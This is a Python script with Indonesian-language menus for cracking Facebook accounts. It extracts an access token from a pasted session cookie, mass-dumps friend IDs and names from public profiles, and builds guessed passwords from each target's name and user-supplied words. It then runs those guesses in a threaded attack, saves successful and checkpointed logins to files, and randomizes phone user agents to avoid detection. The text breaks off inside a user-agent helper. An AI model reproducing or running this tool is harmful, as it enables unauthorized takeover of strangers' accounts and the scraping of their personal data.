# -----------------[ IMPORT-MODULE ]-------------------
import requests, json, os, sys, random, datetime, time, re
from rich.console import Console as sol
from concurrent.futures import ThreadPoolExecutor as tred
from rich.panel import Panel as nel
from rich import print as cetak
from rich import pretty

from rich.panel import Panel
from rich import print
from concurrent.futures import ThreadPoolExecutor
from rich.tree import Tree
from rich.console import Console

try:
    import rich
except ImportError:
    cetak(nel("\t• Sedang Menginstall Modul Rich •"))
    os.system("pip install rich")

try:
    import requests
except ImportError:
    cetak(nel("\t• Sedang Menginstall Modul Requests •"))
    os.system("pip install requests && pip install mechanize ")
# ------------------[ USER-AGENT ]-------------------#
pretty.install()
CON = sol()
ugen = []
cokbrut = []
fields = []
ses = requests.Session()
princp = []
# ------------[ INDICATION ]---------------#
(
    id,
    id2,
    loop,
    ok,
    cp,
    akun,
    oprek,
    method,
    lisensiku,
    taplikasi,
    tokenku,
    uid,
    lisensikuni,
) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
cokbrut = []
pwpluss, pwnya = [], []

# ------------[ WARNA-COLOR ]--------------#
P = "\x1b[1;97m"
M = "\x1b[1;91m"
H = "\x1b[1;92m"
K = "\x1b[1;93m"
B = "\x1b[1;94m"
U = "\x1b[1;95m"
O = "\x1b[1;96m"
N = "\x1b[0m"
Z = "\033[1;30m"
sir = "\033[41m\x1b[1;97m"
x = "\33[m"  # DEFAULT
m = "\x1b[1;91m"  # RED +
k = "\033[93m"  # KUNING +
h = "\x1b[1;92m"  # HIJAU +
hh = "\033[32m"  # HIJAU -
u = "\033[95m"  # UNGU
kk = "\033[33m"  # KUNING -
b = "\33[1;96m"  # BIRU -
p = "\x1b[0;34m"  # BIRU +
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
P2 = "[#FFFFFF]"  # PUTIH
J2 = "[#FF8F00]"  # JINGGA
puti = '\x1b[1;97m'# WARNA-PUTIH
colors = ["\033[0;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m","\033[0;92m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;35m", "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;37m", "\033[1;90m", "\033[0;91m","\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m","\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m","\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m","\033[0;104m", "\033[1;104m", "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m"]
asu = random.choice([m, h, u, b])
# --------------------[ CONVERTER-BULAN ]--------------#
dic = {
    "1": "January",
    "2": "February",
    "3": "March",
    "4": "April",
    "5": "May",
    "6": "June",
    "7": "July",
    "8": "August",
    "9": "September",
    "10": "October",
    "11": "November",
    "12": "December",
}
dic2 = {
    "01": "January",
    "02": "February",
    "03": "March",
    "04": "April",
    "05": "May",
    "06": "June",
    "07": "July",
    "08": "August",
    "09": "September",
    "10": "October",
    "11": "November",
    "12": "Devember",
}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = "OK-" + str(tgl) + "-" + str(bln) + "-" + str(thn) + ".txt"
cpc = "CP-" + str(tgl) + "-" + str(bln) + "-" + str(thn) + ".txt"


# ------------------[ MACHINE-SUPPORT ]---------------#
def asepyusup(u):
    for e in u + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


# ------------------[ LOGO-LAKNAT ]-----------------#
def loading():
    animation = [
        "[\x1b[1;91m■\x1b[0m□□□□□□□□□]",
        "[\x1b[1;92m■■\x1b[0m□□□□□□□□]",
        "[\x1b[1;93m■■■\x1b[0m□□□□□□□]",
        "[\x1b[1;94m■■■■\x1b[0m□□□□□□]",
        "[\x1b[1;95m■■■■■\x1b[0m□□□□□]",
        "[\x1b[1;96m■■■■■■\x1b[0m□□□□]",
        "[\x1b[1;97m■■■■■■■\x1b[0m□□□]",
        "[\x1b[1;98m■■■■■■■■\x1b[0m□□]",
        "[\x1b[1;99m■■■■■■■■■\x1b[0m□]",
        "[\x1b[1;910m■■■■■■■■■■\x1b[0m]",
    ]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(
            f"\r>> {H}Loading...{N} " + animation[i % len(animation)] + "\x1b[0m "
        )
        sys.stdout.flush()


def login():
    asep()
    Console(width=50, style="bold hot_pink2").print(
        Panel(
            "[italic green]masukan cookie anda saran jangan pake akun pribadi[italic white]",
            subtitle="╭───",
            subtitle_align="left",
            title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (MASUKAN COOKIE) [bold green]<[bold yellow]<[bold red]<",
        )
    )
    cok = Console().input("[bold hot_pink2]   ╰─> ")
    try:
        head = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
        }
        link = ses.get(
            "https://web.facebook.com/adsmanager?_rdc=1&_rdr",
            headers=head,
            cookies={"cookie": cok},
        )
        find = re.findall("act=(.*?)&nav_source", link.text)
        if len(find) == 0:
            Console(width=50, style="bold hot_pink2").print(
                Panel(
                    "[italic green]Cookie Valid Silahkan cari cookies baru atu buat cookie Baru [italic white]",
                    subtitle="",
                    subtitle_align="left",
                )
            )
            time.sleep(2)
            exit()
        else:
            for x in find:
                xz = ses.get(
                    f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer",
                    headers=head,
                    cookies={"cookie": cok},
                )
                took = re.search("(EAAB\w+)", xz.text).group(1)
                open(".tok.txt", "a").write(took)
                open(".cok.txt", "a").write(cok)
                exit(
                    f"Token : {took} \ncookies aktif,jalankan ulang perintah nya dengan ketik python run.py"
                )
    except Exception as e:
        exit(e)


# ------------------[ BAGIAN-MENU ]----------------#
def menu():
    os.system("cls" if os.name == "nt" else "clear")
    asep()
    try:
        token = open(".tok.txt", "r").read()
        cok = open(".cok.txt", "r").read()
    except (IOError, KeyError, FileNotFoundError):
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic green]cookie invalid [italic white]",
                subtitle="",
                subtitle_align="left",
            )
        )
        time.sleep(2)
        os.system("cls" if os.name == "nt" else "clear")
        login()
    try:
        info_datafb = ses.get(
            f"https://graph.facebook.com/me?fields=name,id&access_token={token}",
            cookies={"cookies": cok},
        ).json()
        nama = info_datafb["name"]
        uidfb = info_datafb["id"]
    except requests.exceptions.ConnectionError:
        exit(f"\nTidak ada koneksi")
    except KeyError:
        try:
            os.remove(".cok.txt")
            os.remove(".tok.txt")
        except:
            pass
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic green]Kaya nya akun anda terkena cekpoin...! [italic white]",
                subtitle="",
                subtitle_align="left",
            )
        )
        os.system("cls" if os.name == "nt" else "clear")
        login()
    Console(width=50, style="bold hot_pink2").print(
        Panel(
            "[italic green]1.[italic white] Crack Publik [italic green] [ ON ] \n[italic green]2.[italic white] Crack Massal [italic green] [ ON ] \n[italic green]3.[italic white] Crack File [italic red] [ OFF ] \n[italic green]4.[italic white] Dump Id Ke File [italic green] [ ON ] \n[italic green]5.[italic white] Lapor Bug \n[italic green]0.[italic white] Keluar",
            subtitle="╭───",
            subtitle_align="left",
            title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (BAGIAN MENU) [bold green]<[bold yellow]<[bold red]<",
        )
    )
    asepyusup = Console().input("[bold hot_pink2]   ╰─> ")
    if asepyusup in ["1"]:
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic green]Gunakan uid Publik,Jangan Perivat[italic white]",
                subtitle="╭───",
                subtitle_align="left",
                title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (UID PUBLIK) [bold green]<[bold yellow]<[bold red]<",
            )
        )
        idt = Console().input("[bold hot_pink2]   ╰─> ")
        dump(idt, "", {"cookie": cok}, token)
        setting()
    elif asepyusup in ["2"]:
        massal()
    elif asepyusup in ["3"]:
        crack_file()
    elif asepyusup in ["4"]:
        multi_dump()
    elif asepyusup in ["5"]:
        Gabung()
    elif asepyusup in ["0"]:
        os.system("rm -rf .tok.txt")
        os.system("rm -rf .cookie.txt")
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic green]Sukses [italic white]",
                subtitle="",
                subtitle_align="left",
            )
        )
    else:
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic green]Pilih yang bener [italic white]",
                subtitle="",
                subtitle_align="left",
            )
        )
        exit()


def Gabung():
    Console(width=50, style="bold hot_pink2").print(
        Panel(
            "[italic green]Tunggu Sedang Arah Kan ke Admin [italic white]",
            subtitle="",
            subtitle_align="left",
        )
    )
    loading()
    os.system("xdg-open https://www.facebook.com/zuck")
    time.sleep(5)
    menu()


###-----[ DUMP PUBLIK ]-----###
def dump(idt, fields, cookie, token):
    try:
        headers = {
            "connection": "keep-alive",
            "accept": "*/*",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "sec-ch-ua-mobile": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
            "accept-encoding": "gzip, deflate",
            "accept-language": "id-ID,id;q=0.9",
        }
        if len(id) == 0:
            params = {
                "access_token": token,
                "fields": f"name,friends.fields(id,name,birthday)",
            }
        else:
            params = {
                "access_token": token,
                "fields": f"name,friends.fields(id,name,birthday).after({fields})",
            }
        url = ses.get(
            f"https://graph.facebook.com/{idt}",
            params=params,
            headers=headers,
            cookies=cookie,
        ).json()
        for i in url["friends"]["data"]:
            # print(i["id"]+"|"+i["name"])
            id.append(i["id"] + "|" + i["name"])
            sys.stdout.write(f"\r sedang dump... {len(id)}"),
            sys.stdout.flush()
        dump(idt, url["friends"]["paging"]["cursors"]["after"], cookie, token)
    except:
        pass
####---------------[ DUMP MASSAL ]----------------]####
def massal():
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f'>>> {H}Mau Berapa ID ?{P} : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f">>> {H}Masukan Ids Ke {P}" +str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      print("Total DUMP  : "+str(len(id))) 
	      setting()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit() 
###----------[ dump multi extract public ]----------###
def multi_dump():
	print()
	try:
	    os:mkdir('dump')
	except:pass
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		id_limit = int(input(f'>> {H}Mau Berapa IDs{m} ?{N} : '))
		Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic white]Nama Dan Lokasi Untuk File Keluar\nContoh : /dump/fbid.txt\nJika ingin Di lokasi sekarang\nContoh : fbid.txt [italic white]",
                subtitle="",
                subtitle_align="left",
            )
        )
		file_name = input(f'>> {H}Nama Untuk File{N} :{N} ')
#		wkwk  = ('dump/' + file_name + '.txt').replace(' ', '_')
#		xxx = open(wkwk, 'w')
		Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic white]Id Teman Harus Publik [italic white]",
                subtitle="",
                subtitle_align="left",
            )
        )
	except ValueError:
	    exit()
	if id_limit<1 or id_limit>1000:
	    exit()
	ses=requests.Session()
	id_number = 0
	for KOTG49H in range(id_limit):
		id_number+=1
		Enter_id = input(f">> {H}Masukkan Id Yang Ke {N}" + str(id_number) + f" : ")
		uid.append(Enter_id)
	for user in uid:
	    try:
	       head = ({"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"})
	       if len(id) == 0:
	           params = ({'access_token': token,'fields': "friends"})
	       else:
	           params = ({'access_token': token,'fields': "friends"})
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for cbrl in url['friends']['data']:
	           try:
	               cbrlx = (cbrl['id']+'|'+cbrl['name']);open(f'%s'%(file_name),'a').write(cbrl['id']+'|'+cbrl['name']+'\n')
	               abc = (cbrl['id'])
	               jj = len(id)
	               x = random.choice(colors)
	               #print(f" {x}Success Dump From : {abc}\033[0m Total ids : {jj}") 
	               if cbrlx in id:pass
	               else:id.append(cbrlx)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      Console(width=50, style="bold hot_pink2").print(Panel(f"[italic white]sukses mengumpulkan [white]{len(id)}",title=f"[bold red]>[bold yellow]>[bold green]>[hot_pink2] ids total [bold green]<[bold yellow]<[bold red]<",style=f"bold hot_pink2"))
	      Console(width=50, style="bold hot_pink2").print(Panel(f"[italic white]File You Save in [blod hot_pink2]{file_name}",title=f"[bold red]>[bold yellow]>[bold green]>[hot_pink2] SAVE [bold green]<[bold yellow]<[bold red]<",style=f"bold hot_pink2"))
	      input(f"\n [ PRESS ENTER TO GO BACK ]  ")
	      menu()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()

# -------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
    try:
        vin = os.listdir("dump/")
    except FileNotFoundError:
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic green]File Tidak Temukan [italic white]",
                subtitle="",
                subtitle_align="left",
            )
        )
        time.sleep(2)
        exit()
    if len(vin) == 0:
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic green] BUAT DUMP DULU KETIK Y/T[italic white]",
                subtitle="╭───",
                subtitle_align="left",
                title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (ASEP DUMP) [bold green]<[bold yellow]<[bold red]<",
            )
        )
        kontol = Console().input("[bold hot_pink2]   ╰─> ")
        if kontol in [""]:
            Console(width=50, style="bold hot_pink2").print(
                Panel(
                    "[italic green]Pilih yang bener [italic white]",
                    subtitle="",
                    subtitle_align="left",
                )
            )
        elif kontol in ["y", "Y"]:
            Console(width=50, style="bold hot_pink2").print(
                Panel(
                    "[italic green]Dump Dulu [italic white]",
                    subtitle="",
                    subtitle_align="left",
                )
            )
            time.sleep(3)
            exit()
        elif kontol in ["t", "T"]:
            Console(width=50, style="bold hot_pink2").print(
                Panel(
                    "[italic green]Terserah lu ajah Bang [italic white]",
                    subtitle="",
                    subtitle_align="left",
                )
            )
            time.sleep(3)
            exit()
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic green]Anda Tidak Memilki File Dump [italic white]",
                subtitle="",
                subtitle_align="left",
            )
        )
        time.sleep(2)
        exit()
    else:
        cih = 0
        lol = {}
        for isi in vin:
            try:
                hem = open("" + isi, "r").readlines()
            except:
                continue
            cih += 1
            if cih < 100:
                nom = "" + str(cih)
                lol.update({str(cih): str(isi)})
                lol.update({nom: str(isi)})
                print(f"%s. %s ({h} %s{x} idz )" % (nom, isi, len(hem)))
            else:
                lol.update({str(cih): str(isi)})
                print(
                    "["
                    + str(cih)
                    + "] "
                    + isi
                    + " [ "
                    + str(len(hem))
                    + " Account ]"
                    + H
                )
                print(" %s. %s ({h} %s {x}idz) " % (cih, isi, len(hem)))
        geeh = input("\nPilih : ")
        try:
            geh = lol[geeh]
        except KeyError:
            Console(width=50, style="bold hot_pink2").print(
                Panel(
                    "[italic green]Pilih yang bener [italic white]",
                    subtitle="",
                    subtitle_align="left",
                )
            )
            time.sleep(3)
            exit()
        try:
            lin = open("" + geh, "r").read().splitlines()
        except:
            Console(width=50, style="bold hot_pink2").print(
                Panel(
                    "[italic green]Cek Aing Ge Dump Hela [italic white]",
                    subtitle="",
                    subtitle_align="left",
                )
            )
            time.sleep(2)
            exit()
        for xid in lin:
            id.append(xid)
        setting()


# -------------[ PENGATURAN-IDZ ]---------------#
def setting():
    print("")
    Console(width=50, style="bold hot_pink2").print(
        Panel(
            "[italic green]1.[italic white] Urutan Olid ke New \n[italic green]2.[italic white] Urutan New ke olid \n[italic green]3.[italic white] Random ",
            subtitle="╭───",
            subtitle_align="left",
            title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (BAGIAN URUTAN) [bold green]<[bold yellow]<[bold red]<",
        )
    )
    hu = Console().input("[bold hot_pink2]   ╰─> ")
    if hu in ["1", "01"]:
        for tua in sorted(id):
            id2.append(tua)

    elif hu in ["2", "02"]:
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = bcm - 1
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ["3", "03"]:
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic green]Pilih Yang Bener [italic white]",
                subtitle="",
                subtitle_align="left",
            )
        )
        exit()
    Console(width=50, style="bold hot_pink2").print(
        Panel(
            "[italic green]1.[italic white] Validate",
            subtitle="╭───",
            subtitle_align="left",
            title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (BAGIAN METHODE) [bold green]<[bold yellow]<[bold red]<",
        )
    )
    hc = Console().input("[bold hot_pink2]   ╰─> ")
    if hc in ["1", "01"]:
        method.append("async")
    elif hc in [""]:
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic green]Pilih Yang Bener [italic white]",
                subtitle="",
                subtitle_align="left",
            )
        )
        setting()
    else:
        method.append("async")
    Console(width=50, style="bold hot_pink2").print(
        Panel(
            "[italic white]Password Tambahan Pilih [italic green](Y atu T)[italic white]",
            subtitle="╭───",
            subtitle_align="left",
            title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (PASSWORD) [bold green]<[bold yellow]<[bold red]<",
        )
    )
    pwplus = Console().input("[bold hot_pink2]   ╰─> ")
    if pwplus in ["y", "Y"]:
        pwpluss.append("ya")
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic white]Masukan kata sandi tambahan contoh [italic green]Bagong,Ngentod[italic white]\nSaran kata sandi daeraah Target Contoh [italic green]kalimantan,bandung,jonggol[italic white]",
                subtitle="╭───",
                subtitle_align="left",
                title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (TAMBAHKAN PASSWORD) [bold green]<[bold yellow]<[bold red]<",
            )
        )
        pwku = Console().input("[bold hot_pink2]   ╰─> ")
        pwkuh = pwku.split(",")
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append("no")
    passwrd()


# -------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
    Console(width=50, style="bold hot_pink2").print(
        Panel(
            """[bold white]Hasil Crack[bold green] Ok[bold white] Tersimpan Di :[bold green] Results/Ok.txt
[bold white]Hasil Crack[bold red] Cp[bold white] Tersimpan Di :[bold red] Results/Cp.txt""",
            title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Results Crack) [bold green]<[bold yellow]<[bold red]",
        )
    )
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf, nmf = yuzong.split("|")[0], yuzong.split("|")[1].lower()
            frs = nmf.split(" ")[0]
            pwv = []
            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                else:
                    pwv.append(nmf)
                    #pwv.append(frs + "123")
                    #pwv.append(frs + "1234")
                    #pwv.append(frs + "12345")
                    #pwv.append(frs + "123456")
                    #pwv.append(frs + "321")
            else:
                if len(frs) < 3:
                    pwv.append(nmf)
                else:
                    pwv.append(nmf)
                    #pwv.append(frs + "123")
                    #pwv.append(frs + "1234")
                    #pwv.append(frs + "12345")
                    #pwv.append(frs + "123456")
                    #pwv.append(frs + "321")
            if "ya" in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:
                pass
            if "async" in method:
                pool.submit(crack, idf, pwv)
            else:
                pool.submit(crack, idf, pwv)

    Console(width=50, style="bold hot_pink2").print(
        Panel(
            "[italic green]Crack Selesai [italic white]",
            subtitle="",
            subtitle_align="left",
        )
    )
    print(f"[•] OK : %s " % (ok))
    print(f"[•] CP : %s " % (cp))
    print("")
    Console(width=50, style="bold hot_pink2").print(
        Panel(
            "[italic green]Lanjut apa Udah ? Pilih (Y/T) [italic white]",
            subtitle="╭───",
            subtitle_align="left",
            title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (SELESAI) [bold green]<[bold yellow]<[bold red]<",
        )
    )
    woi = Console().input("[bold hot_pink2]   ╰─> ")
    if woi in ["y", "Y"]:
        exit()
    else:
        Console(width=50, style="bold hot_pink2").print(
            Panel(
                "[italic green]love Sayangku [italic white]",
                subtitle="",
                subtitle_align="left",
            )
        )
        time.sleep(2)
        exit()


def ua_valid():
    rr = random.randint
    rc = random.choice
    android = random.choice(["10","12","13","14"])
    redmi1 = random.choice(["zh-tw","en-us","zh-cn"])
    redmi2 = random.choice(["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"])
    redmi3 = random.choice(['SM-G970F|NRD90M', 'SM-N975F|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H'])
    redmi4 = f"Mozilla/5.0 (Linux; U; Android {android}; {redmi1}; {redmi2} Build/{redmi3}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,109))}.0.{str(rr(4896,5414))}.{str(rr(118,127))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.{str(rr(8,9))}.{str(rr(5,221128))} swan-mibrowser"
    return rc([redmi4])

def iphonee():
    rr = random.randint
    rc = random.choice
    iphone1 = random.choice(["4_3","9_0"])
    iphone2 = random.choice(["en-US","en-GB","%lang2%"])
    iphone3 = random.choice(["533.17.9","600.1.4"])
    iphone4 = random.choice(["5.0.2","9_0"])
